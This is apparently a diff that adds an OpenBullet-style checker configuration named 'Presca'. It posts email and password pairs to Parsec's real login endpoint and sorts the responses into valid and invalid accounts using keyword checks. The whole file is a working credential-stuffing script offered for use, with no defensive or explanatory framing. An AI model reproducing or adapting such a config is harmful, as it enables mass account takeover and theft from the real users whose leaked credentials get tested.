@@ -1,0 +1,38 @@
+[SETTINGS]
+{
+  "Name": "Presca",
+  "SuggestedBots": 1,
+  "LastModified": "2018-10-06T12:30:06.3314682+00:00",
+  "AdditionalInfo": "",
+  "Author": "Meyer",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://parsecgaming.com/v1/auth" AutoRedirect=TRUE 
+  CONTENT "{\"email\":\"<USER>\",\"expiration_type\":\"short\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://ui.parsecgaming.com/login" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\": \"Your password is incorrect.\"}" 
+    KEY "{\"error\": \"No user exists for that email.\"}" 
+  KEYCHAIN Success OR 
+    KEY "user_id\":" 
